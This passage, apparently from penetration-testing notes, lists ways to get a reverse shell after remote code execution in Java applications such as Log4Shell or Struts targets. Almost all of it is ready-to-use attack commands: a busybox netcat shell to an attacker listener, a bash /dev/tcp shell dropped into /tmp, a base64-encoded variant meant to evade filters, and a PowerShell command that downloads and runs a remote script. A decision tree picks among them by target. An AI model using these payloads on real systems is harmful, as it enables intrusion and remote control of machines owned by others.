#### Solution 2: `busybox nc -e` (Direct Binary Execution)
`busybox` contains a self-contained implementation of `netcat` that natively supports the `-e` execution flag:
```bash
busybox nc [KALI_IP] 4444 -e /bin/bash
```

#### Solution 3: Multi-Step Script Drop (Universal Reliability)
Execute three discrete `exec()` calls to write, mark executable, and run an independent script file:
```bash
# Call 1: Write shell payload into /tmp
echo 'bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1' > /tmp/shell.sh

# Call 2: Make executable
chmod +x /tmp/shell.sh

# Call 3: Execute script
/tmp/shell.sh
```

#### Solution 4: Base64 Piping Pipeline (Most Portable)
Encode the reverse shell payload into Base64 and decode it via a piped shell execution string (the mechanism utilized by [revshells.com](https://revshells.com)):
```bash
# 1. On Kali, encode the reverse shell:
echo 'bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1' | base64

# 2. Supply the Java payload syntax:
bash -c {echo,[BASE64_PAYLOAD]}|{base64,-d}|{bash,-i}
```

---

### Java Reverse Shell Decision Tree

```
RCE within a Java Execution Context (Text4Shell, Log4Shell, Struts, Tomcat)?
│
├── Linux Target?
│   ├── bash available? -> bash -c 'bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1'
│   │
│   ├── Special characters filtered? -> bash -c {echo,BASE64}|{base64,-d}|{bash,-i}
│   │
│   ├── busybox available? -> busybox nc [KALI_IP] 4444 -e /bin/bash
│   │
│   └── Restrictive environment? -> Multi-step drop (/tmp/shell.sh)
│
└── Windows Target?
    └── PowerShell -> powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://[KALI_IP]/shell.ps1')"
```
